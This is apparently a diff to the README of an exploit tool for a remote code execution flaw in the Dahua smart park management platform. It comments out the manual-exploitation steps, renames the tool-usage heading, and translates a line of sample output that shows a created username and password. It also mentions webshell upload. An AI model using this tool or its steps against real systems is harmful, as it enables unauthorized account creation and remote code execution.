@@ -1,6 +1,7 @@
 # DaHuaWPMSinitSessionRCE
 > 大华智慧园区综合管理平台initSession泄漏远程代码执行漏洞。
 
+<!--
 ## 手动利用
 
 1. 获取一个有效Session。
@@ -255,8 +256,9 @@ Connection: close
 
 enpjejok
 ```
+-->
 
-## 工具使用
+## 自动利用
 
 检测任意用户创建漏洞。
 
@@ -277,7 +279,7 @@ $ go run main.go -p http://127.0.0.1:8080 -u http://example.com:8881
 [INFO] Target: http://example.com:8881
 [INFO] Proxy: http://127.0.0.1:8080
 [INFO] JSESSIONID: 4D23D1A593332723043CE44C98BEBF84
-[INFO] 用户名/密码: h20di/tgq1cu69
+[INFO] Username/Password: h20di/tgq1cu69
 ```
 
 Webshell文件上传利用。
